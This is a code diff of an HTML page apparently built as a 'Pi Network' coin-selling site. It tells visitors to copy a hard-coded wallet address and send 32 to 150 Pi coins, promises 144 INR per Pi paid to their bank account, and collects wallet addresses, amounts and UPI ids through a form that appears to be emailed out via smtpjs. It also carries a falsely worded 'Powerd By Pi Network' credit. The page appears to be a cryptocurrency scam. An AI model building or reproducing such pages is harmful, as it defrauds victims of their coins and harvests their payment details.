@@ -3,13 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <link rel="stylesheet" href="picoin/style.css">
+    <title>Pi Network</title>
 </head>
 <body>
-    <a href="index.html">Back</a>
-    <h2>Pi Coin Sell Start</h2>
-    <h2>31/08/2024</h2>
+
+
+
+    <div class="piwidthr">
+  <!-- TradingView Widget BEGIN -->
+<div class="tradingview-widget-container">
     
-    
+    <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
+    {
+    "symbols": [
+      {
+        "proName": "BITSTAMP:BTCUSD",
+        "title": "Bitcoin"
+      },
+      {
+        "proName": "BITSTAMP:ETHUSD",
+        "title": "Ethereum"
+      },
+      {
+        "description": "",
+        "proName": "HTX:PIUSDT"
+      },
+      {
+        "description": "",
+        "proName": "UNISWAP:PIWETH_48BD18.USD"
+      },
+      {
+        "description": "PI coin",
+        "proName": "PANCAKESWAP:PIWBNB_28C4DD.USD"
+      }
+    ],
+    "showSymbolLogo": true,
+    "isTransparent": false,
+    "displayMode": "adaptive",
+    "colorTheme": "white",
+    "locale": "en"
+  }
+    </script>
+  </div>
+  <!-- TradingView Widget END -->
+</div>
+
+<div class="copybooto">
+   
+ <h2>Copy This Wallet Address Send Pi</h2>
+ 
+ <h4 >Minimum 32 Pi Coin Maximum 150 Pi Coin</h4>
+ <br>
+ <h4>HotBit Wallet Address </h4>
+ 
+<div id="textToCopy" class="link2">GB2MLRBVBPDP6YX76EWEBLACRSEFN2H6WJ7XTR6OL5F2K2BJ4EGAVEVF</div>
+<button onclick="copyText()">Copy Address</button>
+
+<p>After Sending Coin Make sure To Place Withdrawal Request</p>
+<br>
+<br>
+
+<div class="blink"><b>Live Rate</b></div> 
+<div class="blink1"> 1 Pi=144 INR</div>
+<p>After Withdrawal You GET 1pi= 144 Inr Rate Price In Your Bank Account</p>
+
+
+
+
+
+</div>
+
+
+  <div class="charthandle"></div>
+
+    <div class="widthrawl">
+        <form onsubmit="emailSend(); reset(); return false;" class="contact-left6">
+          <div class="contact-left-title">
+              <h2>Sell Pi Coin</h2>
+              <hr>
+          </div>
+          
+          <input type="text" name="name" placeholder="Enter Wallet Address" class="contact-inputs6" id="name2" required>
+        
+          <input type="number" name="email" placeholder="Amount" class="contact-inputs6" id="email2" required>
+          <input type="text" placeholder="Enter UPI id" class="contact-inputs6" id="textarea2" required>
+           <button type="submit">Withdrawal</button>
+      
+      </form>
+      </div>
+      <div class="analytiv">
+        <!-- TradingView Widget BEGIN -->
+<div class="tradingview-widget-container">
+    <div class="tradingview-widget-container__widget"></div>
+    <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Powerd By Pi Network</span></a></div>
+    <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-technical-analysis.js" async>
+    {
+    "interval": "1m",
+    "width": "100%",
+    "isTransparent": false,
+    "height": "100%",
+    "symbol": "BITMART:PIUSDT",
+    "showIntervalTabs": true,
+    "displayMode": "single",
+    "locale": "en",
+    "colorTheme": "white"
+  }
+    </script>
+  </div>
+  <!-- TradingView Widget END -->
+      </div>
+
+    </div>
+
+  
+
+<script src="app.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </body>
 </html>
